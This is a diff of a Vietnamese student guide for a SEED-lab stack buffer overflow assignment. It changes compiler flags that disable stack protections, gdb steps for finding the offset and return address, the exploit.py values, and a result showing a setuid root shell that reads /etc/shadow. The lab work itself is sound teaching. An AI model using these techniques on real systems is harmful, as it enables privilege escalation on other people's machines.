@@ -40,8 +40,8 @@ sudo sysctl -w kernel.randomize_va_space=0
 
 ```bash
 cd code
-gcc -m32 -g -O0 -fno-stack-protector -z execstack -o stack stack.c
-sudo chown root stack
+gcc -m32 -g -O0 -fno-stack-protector -z execstack -no-pie -o stack stack.c
+sudo chown root:root stack
 sudo chmod 4755 stack
 ls -l stack        # phải thấy '-rwsr-xr-x ... root ...'  (chữ 's' = setuid)
 ```
@@ -53,27 +53,29 @@ make            # biên dịch
 make setuid     # gán quyền root
 ```
 
-> **Lưu ý VLA + execstack:** với một số bản gcc mới, `char buffer[bufsize]` (VLA) có thể làm trình biên dịch chèn kiểm tra. Nếu gặp khó, có thể biên dịch thêm `-U_FORTIFY_SOURCE -D_FORTIFY_SOURCE=0`. Trên SEED VM mặc định không cần.
+> **Lưu ý:** `stack.c` dùng `alloca(buffer_size)` nên buffer cấp phát động trên stack; cần `-fno-stack-protector -z execstack -no-pie`. Trên SEED VM mặc định đủ.
 
 ---
 
-## 3. Chạy thử để biết kích thước buffer của nhóm
+## 3. Chạy thử để xem thông số của nhóm
+
+`stack.c` chuẩn **không in kích thước chính xác**, chỉ in khoảng để sinh viên tự tư duy:
 
 ```bash
-# cần có badfile trước (tạm thời dùng file rác cũng được để chạy thử in thông số)
-python3 exploit.py        # tạo badfile mẫu
+python3 exploit.py        # tạo badfile (điền offset/ret trước, hoặc badfile mẫu)
 ./stack 23001842
 ```
 
-Màn hình in ra, ví dụ:
+Màn hình in ra:
 
 ```
-MSV (seed)        : 23001842
-Khoang buffer     : [100, 300]
-Kich thuoc buffer : 237 byte
+[HE THONG] Dang thiet lap khong gian bo nho cho MSSV: 23001842
+[HE THONG] Kich thuoc buffer cua ban nam trong khoang [100 - 199] bytes.
+[HE THONG] Khoang lech vi tri Stack cua ban nam trong pham vi [0 - 256] bytes.
+[HE THONG] Payload doc vao: 512 bytes. Dang thuc thi ham bof()...
 ```
 
-Ghi lại **kích thước buffer** (ở đây giả sử 237). Vì `srand(MSV)` là tất định, con số này **cố định cho mỗi MSV**. Nhóm nên chạy đúng MSV mà nhóm chọn nộp bài (ví dụ dùng MSV của Cường: 23001842).
+Kích thước buffer thật = `100 + (MSV % 100)`. Với MSV **23001842**: `100 + 42 = 142` byte (xác nhận bằng gdb bên dưới). Nhóm nên dùng đúng MSV sẽ nộp (ví dụ MSV của Cường: 23001842).
 
 ---
 
@@ -83,35 +85,34 @@ Ghi lại **kích thước buffer** (ở đây giả sử 237). Vì `srand(MSV)`
 gdb -q stack
 ```
 
-Trong gdb:
+Trong gdb (dừng tại dòng `strcpy`, khi đó `buffer` đã được `alloca` trả về):
 
 ```gdb
-(gdb) b bof                 # đặt breakpoint tại hàm bof
+(gdb) b stack.c:19          # breakpoint tại dòng strcpy(buffer, str)
 (gdb) run 23001842          # chạy với MSV của nhóm
-(gdb) p $ebp                # in địa chỉ frame pointer   -> vd $1 = 0xffffcf68
-(gdb) p &buffer             # in địa chỉ buffer          -> vd $2 = 0xffffcedc
-(gdb) p/d ($ebp + 4) - (int)&buffer   # offset theo hệ 10
+(gdb) p $ebp                # frame pointer  -> vd 0xffffc738
+(gdb) p buffer              # dia chi buffer -> vd 0xffffc680
+(gdb) p/d ($ebp + 4) - (int)buffer   # offset (he 10)
 ```
 
 ### Cách tính offset
 
-Return address nằm ngay **trên** saved ebp, tức tại `$ebp + 4`. Vậy:
+`buffer` là **con trỏ** (do `alloca` trả về), nên dùng `buffer` chứ không phải `&buffer`.
+Return address nằm tại `$ebp + 4`. Vậy:
 
 ```
-offset = ($ebp + 4) − &buffer
+offset = ($ebp + 4) − buffer
 ```
 
-Ví dụ với số liệu trên:
+Số liệu thật của nhóm (MSV 23001842):
 
 ```
-offset = (0xffffcf68 + 4) − 0xffffcedc
-       = 0xffffcf6c − 0xffffcedc
-       = 0x90  = 144 (byte)
+offset = (0xffffc738 + 4) − 0xffffc680
+       = 0xffffc73c − 0xffffc680
+       = 0xbc = 188 (byte)
 ```
 
-> ⚠️ **Các địa chỉ trên chỉ là VÍ DỤ.** Nhóm phải đọc số thật từ gdb trên máy của mình và **chụp màn hình** làm bằng chứng (lưu vào `slides/images/`).
-
-**Chụp màn hình cần có:** cửa sổ gdb hiển thị `$ebp`, `&buffer` và phép trừ ra offset.
+> **offset = 188 là giá trị ỔN ĐỊNH** (khoảng cách trong khung hàm), không đổi giữa các lần chạy. Hãy **chụp màn hình** gdb làm bằng chứng (đã lưu sẵn tại `slides/images/gdb_offset.png`).
 
 ---
 
@@ -120,22 +121,18 @@ offset = (0xffffcf68 + 4) − 0xffffcedc
 Ta muốn CPU nhảy vào **giữa vùng NOP sled**, nên chọn:
 
 ```
-ret = &buffer + δ
+ret = buffer + δ
 ```
 
-với δ là khoảng dư an toàn (ví dụ `0x64 = 100`). Ví dụ:
+Số liệu thật: `buffer = 0xffffc680`, chọn δ = `0x150`:
 
 ```
-ret = 0xffffcedc + 0x64 = 0xffffcf40
+ret = 0xffffc680 + 0x150 = 0xffffc7d0
 ```
 
-Có thể chọn δ lớn hơn (ví dụ nửa khoảng NOP) để chắc chắn rơi vào NOP sled, miễn là `ret` vẫn nằm **trước** vùng shellcode trong badfile khi ánh xạ lên stack.
+> **Quan trọng — khác biệt gdb vs lúc chạy thật:** địa chỉ `buffer` tuyệt đối có thể lệch **vài chục byte** giữa gdb và khi chạy `./stack` trực tiếp (do khác biến môi trường, độ dài `PWD`...). Nhưng **NOP sled rộng hấp thụ sai số**: thực nghiệm quét cho thấy **mọi `ret` trong khoảng `[0xffffc7a0, 0xffffc860]` đều cho root shell**. Ta chọn `0xffffc7d0` (giữa khoảng) cho chắc chắn.
 
-> **Chụp màn hình cần có:** cách lấy `&buffer` và phép cộng ra `ret`.
-
-### Vì sao cách này đúng?
-- Đã tắt ASLR ⇒ địa chỉ `&buffer` khi chạy thật = khi chạy trong gdb.
-- NOP sled trải dài từ đầu badfile; `ret` trỏ vào vùng đó nên CPU trượt tới shellcode ở cuối.
+**Chụp màn hình cần có:** gdb in `buffer`, `$ebp` và phép tính offset/ret.
 
 ---
 
@@ -144,15 +141,15 @@ Có thể chọn δ lớn hơn (ví dụ nửa khoảng NOP) để chắc chắn
 Mở `code/exploit.py`, sửa đúng 2 dòng:
 
 ```python
-offset = 0x90          # thay bằng offset nhóm vừa tính (vd 144)
-ret    = 0xffffcf40    # thay bằng ret nhóm vừa tính
+offset = 188           # = ($ebp+4) - buffer
+ret    = 0xffffc7d0    # = buffer + 0x150 (giữa NOP sled)
 ```
 
 Tạo badfile:
 
 ```bash
 python3 exploit.py
-# [+] Da tao badfile (517 byte) ...
+# [+] Da tao badfile (512 byte) ...
 ```
 
 Kiểm tra nhanh nội dung (tùy chọn):
@@ -169,29 +166,29 @@ xxd badfile | head        # đầu file là 90 90 90 ..., có 4 byte ret tại o
 ./stack 23001842
 ```
 
-Nếu thành công:
+Kết quả thật của nhóm (đã chạy thành công):
 
 ```
-MSV (seed)        : 23001842
-Kich thuoc buffer : 237 byte
-# id
-uid=0(root) gid=1000(seed) groups=1000(seed) ...
-# whoami
+$ ./stack 23001842
+uid=0(root) gid=1000(cuonglv2005) groups=1000(cuonglv2005),...
 root
 ```
 
-- Dấu nhắc đổi thành `#`, `id`/`whoami` cho **root** ⇒ thành công.
-- Dòng `Returned Properly` **không** xuất hiện (vì luồng đã bị chuyển hướng).
+- `id` cho **`uid=0(root)`**, `whoami` cho **root** ⇒ chiếm được root shell.
+- Đọc được `/etc/shadow` (file chỉ root đọc được) để chứng minh thêm.
+- Dòng `...Tấn công thất bại` **không** xuất hiện (luồng đã bị chuyển hướng).
 
-> **Chụp màn hình cần có:** terminal hiển thị root shell (`uid=0`).
+> **Chụp màn hình cần có:** terminal hiển thị root shell (`uid=0`). Ảnh thật đã lưu tại `slides/images/exploit_root.png`.
 
 ### Nếu chưa thành công — xử lý
 | Hiện tượng | Nguyên nhân thường gặp | Cách xử lý |
 |------------|------------------------|------------|
-| `Segmentation fault` | offset/ret sai | Kiểm tra lại số gdb, thử tăng/giảm δ |
-| `Returned Properly` in ra | ret không trúng NOP | Tăng δ, kiểm tra little-endian |
-| shell nhưng `uid` không phải 0 | thiếu setuid(0) / quên `chmod 4755` | Kiểm tra shellcode & quyền file |
-| địa chỉ đổi mỗi lần | ASLR còn bật | Chạy lại lệnh tắt ASLR ở mục 1 |
+| `Segmentation fault` | ret không trúng NOP sled | Thử `ret` khác trong khoảng hoạt động (quét `ret` quanh `buffer+0x100..0x200`) |
+| `...Tấn công thất bại` in ra | ret trỏ sai / little-endian | Kiểm tra `ret` và thứ tự byte |
+| shell nhưng `uid` không phải 0 | quên `chmod 4755` / chưa `chown root` | Kiểm tra `ls -l stack` thấy `-rwsr-xr-x root` |
+| địa chỉ đổi nhiều mỗi lần | ASLR còn bật | Chạy lại lệnh tắt ASLR ở mục 1 |
+
+> **Mẹo:** vì địa chỉ `buffer` tuyệt đối lệch chút giữa gdb và lúc chạy, nên chọn `ret` ở **giữa** NOP sled (như `0xffffc7d0`) thay vì sát mép. NOP sled càng rộng, tấn công càng ổn định.
 
 ---
 
@@ -209,10 +206,7 @@ root
 1. Vào overleaf.com → New Project → Upload Project, hoặc tạo project rồi upload thư mục `slides/`.
 2. Mở `main.tex`. Menu → **Compiler: pdfLaTeX** (mặc định).
 3. Bấm **Recompile**. File dùng phông Latin Modern + `babel` tiếng Việt nên nhẹ, biên dịch được trên bản free.
-4. **Chèn ảnh thật:** copy ảnh gdb vào thư mục `images/`, rồi thay dòng `\screenshot{5}{3.5}` trong `main.tex` bằng:
-   ```latex
-   \includegraphics[width=\linewidth]{images/ten-anh.png}
-   ```
+4. **Ảnh đã có sẵn:** slide đã nhúng `images/gdb_offset.png` và `images/exploit_root.png` (ảnh thật của nhóm). Khi quay video, nhóm chụp thêm ảnh gdb/tấn công của chính mình rồi thay thế nếu muốn.
 5. Xuất PPTX (nếu form yêu cầu PowerPoint): tải PDF từ Overleaf, rồi dùng công cụ chuyển PDF→PPTX, hoặc chụp từng slide dán vào PowerPoint. (PDF beamer vẫn là định dạng trình chiếu hợp lệ.)
 
 ---
